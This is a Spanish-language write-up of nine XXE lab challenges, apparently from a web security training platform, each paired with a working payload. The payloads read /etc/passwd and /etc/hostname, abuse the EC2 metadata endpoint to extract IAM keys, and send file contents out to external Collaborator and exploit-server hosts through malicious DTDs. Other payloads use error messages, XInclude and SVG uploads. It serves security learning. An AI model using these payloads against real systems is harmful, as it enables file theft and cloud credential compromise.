## Reto 1: Explotación de XXE mediante entidades externas para recuperar archivos

Este laboratorio tiene una función de "Verificar stock" que analiza la entrada XML y devuelve cualquier valor inesperado en la respuesta.

Para resolver el laboratorio, inyecte una entidad externa XML para recuperar el contenido del /etc/passwd archivo. 
inyectamos una entidad que apunta al archivo /etc/passwd, el cual es devuelto en la respuesta cuando se intenta verificar un producto. Es una demostración clara de cómo una mala configuración del parser XML puede abrir la puerta a una fuga crítica de información en el servidor.


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<stockCheck><productId>
&xxe;
</productId><storeId>1</storeId></stockCheck>
```

## Reto 2:Explotación de XXE para realizar ataques SSRF


Este laboratorio tiene una función de "Verificar stock" que analiza la entrada XML y devuelve cualquier valor inesperado en la respuesta.

El servidor de laboratorio está ejecutando un punto final de metadatos EC2 (simulado) en la URL predeterminada, que es http://169.254.169.254/ Este punto final se puede utilizar para recuperar datos sobre la instancia, algunos de los cuales podrían ser confidenciales.

Para resolver el laboratorio, explote la vulnerabilidad XXE para realizar un ataque SSRF que obtenga la clave de acceso secreta IAM del servidor desde el punto final de metadatos EC2. 

ientadas a realizar ataques de tipo SSRF (Server-Side Request Forgery). Aprovechamos el parser XML de la funcionalidad de comprobación de stock para que, en lugar de acceder a archivos locales, se conecte a un endpoint interno del servidor: la metadata de una instancia EC2 simulada en http://169.254.169.254/.

Mediante iteraciones en la URL de la entidad externa, accedemos progresivamente a los distintos directorios del endpoint hasta llegar a la ruta que expone las credenciales del rol IAM asignado a la máquina. Finalmente, logramos extraer la SecretAccessKey del servidor, evidenciando el riesgo real que supone una XXE con capacidad de SSRF mal controlada.

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/" >]>

<stockCheck><productId>

&xxe;

</productId><storeId>1</storeId></stockCheck>
```

## Reto 3:  XXE ciego con interacción fuera de banda
Este laboratorio tiene una función de "Verificar stock" que analiza la entrada XML pero no muestra el resultado.

Puede detectar la vulnerabilidad ciega XXE activando interacciones fuera de banda con un dominio externo.

Para resolver el laboratorio, utilice una entidad externa para hacer que el analizador XML emita una búsqueda DNS y una solicitud HTTP a Burp Collaborator. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://1vx3htf432deh2hslujax1w2xt3krafz.oastify.com" >]>
<stockCheck><productId>
&xxe;
</productId><storeId>1</storeId></stockCheck>
```

```html
<html><body>ueiq3gq24wgsiwuq86jrttzjjgigz</body></html>
```

## Reto 4: XXE ciego con interacción fuera de banda a través de entidades de parámetros XML

Este laboratorio tiene una función de "Verificar stock" que analiza la entrada XML, pero no muestra ningún valor inesperado y bloquea las solicitudes que contienen entidades externas normales.

Para resolver el laboratorio, utilice una entidad de parámetro para hacer que el analizador XML emita una búsqueda de DNS y una solicitud HTTP a Burp Collaborator.

utilizando una variante más sofisticada. En este caso, la aplicación bloquea las entidades externas tradicionales, lo que nos obliga a recurrir al uso de parameter entities, una técnica menos común pero igualmente poderosa.

El objetivo es forzar al analizador XML a realizar una solicitud externa, y para ello empleamos Burp Collaborator como canal para observar si el servidor realiza conexiones salientes. Si vemos actividad en Collaborator después de enviar nuestra carga, confirmamos la vulnerabilidad.

Este enfoque es especialmente útil en entornos donde se han implementado filtros para mitigar las XXE básicas, pero aún persisten configuraciones inseguras


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://i0jkmakl8jivmjm9qbor2i1j2a82wskh.oastify.com" > %xxe;]>
<stockCheck><productId>
1
</productId><storeId>1</storeId></stockCheck>
```

## Reto 5: Explotación de XXE ciego para exfiltrar datos mediante un DTD externo malicioso

Este laboratorio tiene una función de "Verificar stock" que analiza la entrada XML pero no muestra el resultado.

Para resolver el laboratorio, exfiltra el contenido del /etc/hostname archivo.

Como la aplicación no muestra la respuesta del servidor, debemos forzar que este realice una petición externa que contenga los datos deseados.

Preparamos un archivo DTD en nuestro exploit server que define una entidad para leer el archivo local y otra para enviar su contenido mediante una petición HTTP a Burp Collaborator. Luego referenciamos esta DTD desde la carga XML enviada al stock checker.

Ya tenemos definido y alojado el archivo DTD en nuestro exploit server, y ahora utilizamos este recurso para finalizar la exfiltración del contenido del archivo /etc/hostname.

Repasamos cómo se estructura correctamente la carga XML que referencia esa DTD, y analizamos los resultados obtenidos en Burp Collaborator para verificar que la petición externa con los datos del archivo fue realizada correctamente.

En el Repeater de Burpsuite:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a6a00af040ff6f98062d9e301600012.exploit-server.net/exploit" > %xxe;]>
<stockCheck><productId>
1
</productId><storeId>1</storeId></stockCheck>
```

En el exploit-server de burpsuite:
- &#x25 significa (%)

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname"> 
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://adrcz2xdlbvnzbz1331jfaebf2lw9mxb.oastify.com/?content=%file'>"> %eval; 
%exfil;
```

## Reto 6:Explotación de XXE ciego para recuperar datos mediante mensajes de error


Este laboratorio tiene una función de "Verificar stock" que analiza la entrada XML pero no muestra el resultado.

Para resolver el laboratorio, utilice un DTD externo para activar un mensaje de error que muestre el contenido del /etc/passwd archivo.

El laboratorio contiene un enlace a un servidor de exploits en un dominio diferente donde puedes alojar tu DTD malicioso.  



una variante de XXE ciega que se apoya en mensajes de error para filtrar información sensible. Continuamos aprovechando el sistema de entidades parametrizadas, pero en lugar de usar canales externos como Collaborator, utilizamos rutas inválidas para provocar errores intencionados que revelen el contenido del archivo /etc/passwd.

Preparamos una DTD maliciosa en nuestro exploit server que lee ese archivo y lo introduce como parte de una ruta errónea. Al invocar esa DTD desde el XML enviado al endpoint vulnerable, el servidor intenta acceder a una ruta inválida que incluye el contenido del archivo, lo que provoca un error con el texto completo de la entidad.

Analizamos cómo estructurar correctamente tanto la DTD como el XML final y validamos el resultado observando la aparición del archivo dentro del mensaje de error devuelto.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a6a00af040ff6f98062d9e301600012.exploit-server.net/exploit" > %xxe;]>
<stockCheck><productId>
1
</productId><storeId>1</storeId></stockCheck>
```

En el exploit server:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file://noexiste/%file;'>"> 
%eval; 
%exfil;
```

## Reto 7:Explotación de XInclude para recuperar archivos


Este laboratorio tiene una función de "Verificar stock" que integra la entrada del usuario dentro de un documento XML del lado del servidor que posteriormente se analiza.

Como no controlas todo el documento XML, no puedes definir un DTD para lanzar un ataque XXE clásico.

Para resolver el laboratorio, inyecte un XIncludeDeclaración para recuperar el contenido de la /etc/passwd archivo. 
una técnica alternativa a XXE basada en la inyección de XInclude. A diferencia de los laboratorios anteriores, aquí no podemos definir una DTD personalizada, ya que el XML del servidor está parcialmente predefinido y no nos permite insertar declaraciones externas.

Para sortear esa limitación, aprovechamos la funcionalidad XInclude, que permite incluir archivos externos dentro de documentos XML válidos. En este caso, inyectamos una etiqueta ‘xi:include‘ con el espacio de nombres correspondiente y apuntamos al archivo /etc/passwd, usando ‘parse=”text”‘ para evitar errores de interpretación estructural.

```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

## Reto 8 :Explotación de XXE mediante la carga de archivos de imagen

Este laboratorio permite a los usuarios adjuntar avatares a los comentarios y utiliza la biblioteca Apache Batik para procesar archivos de imágenes de avatar.

Para resolver el laboratorio, cargue una imagen que muestre el contenido del /etc/hostnameArchivo después de procesarlo. Luego, use el botón "Enviar solución" para enviar el valor del nombre de host del servidor. 

sta vez aprovechando la funcionalidad de subida de imágenes del laboratorio. El servidor permite a los usuarios subir avatares en formato SVG, los cuales son procesados con la librería Apache Batik. Esta librería interpreta entidades definidas dentro del SVG, lo que abre la puerta a un ataque XXE clásico.

Creamos un archivo SVG en el que definimos una entidad que apunta al archivo del sistema que contiene el nombre del host. Luego, insertamos esa entidad como contenido textual del SVG. Al subir la imagen como avatar en un comentario, el servidor procesa el archivo y renderiza el contenido de esa entidad, mostrando así el nombre del host en el propio avatar. Esta información es la que se necesita para resolver el laboratorio.

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

## Reto 9:Explotación de XXE para recuperar datos mediante la reutilización de un DTD local

Este laboratorio tiene una función de "Verificar stock" que analiza la entrada XML pero no muestra el resultado.

Para resolver el laboratorio, active un mensaje de error que contenga el contenido de la /etc/passwd archivo.

Necesitará hacer referencia a un archivo DTD existente en el servidor y redefinir una entidad a partir de él.
Esta vez, el laboratorio requiere que reutilicemos un DTD ya presente en el sistema de la víctima para redefinir una entidad y provocar una lectura de datos sensibles. Específicamente, aprovechamos el archivo ‘docbookx.dtd‘ que suele estar disponible en sistemas con entorno GNOME.

Definimos una entidad que referencia este DTD y redefinimos una entidad existente llamada ISOamso para incluir una carga maliciosa. Esta carga intenta leer el contenido del archivo passwd y generar un error utilizando esa información en una ruta inválida. Aunque el resultado no se muestra directamente, el error generado incluye el contenido leído, resolviendo así el laboratorio.

